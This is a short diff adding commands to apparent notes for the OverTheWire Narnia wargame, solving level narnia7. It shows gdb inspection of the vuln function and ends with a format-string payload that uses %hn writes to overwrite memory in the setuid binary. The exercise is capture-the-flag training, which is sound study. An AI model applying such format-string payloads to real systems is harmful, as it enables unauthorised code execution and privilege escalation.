@@ -100,6 +100,20 @@ q
 whoami 
 cat /etc/narnia_pass/narnia7
 
+# narnia7 -> narnia8
+vim narnia7.c
+./narnia7
+./narnia7 AAAA
+gdb -q ./narnia7
+set disassembly-flavor intel
+r a
+disas vuln
+br *vuln+190
+r bbbb
+x/30x $esp
+q
+./narnia7 $(python -c’print(“\x2e\xd6\xff\xff\x1c\xd6\xff\xff”)’)%.2044x%6\$hn%.32514x%7\$hn
+
 
 
 
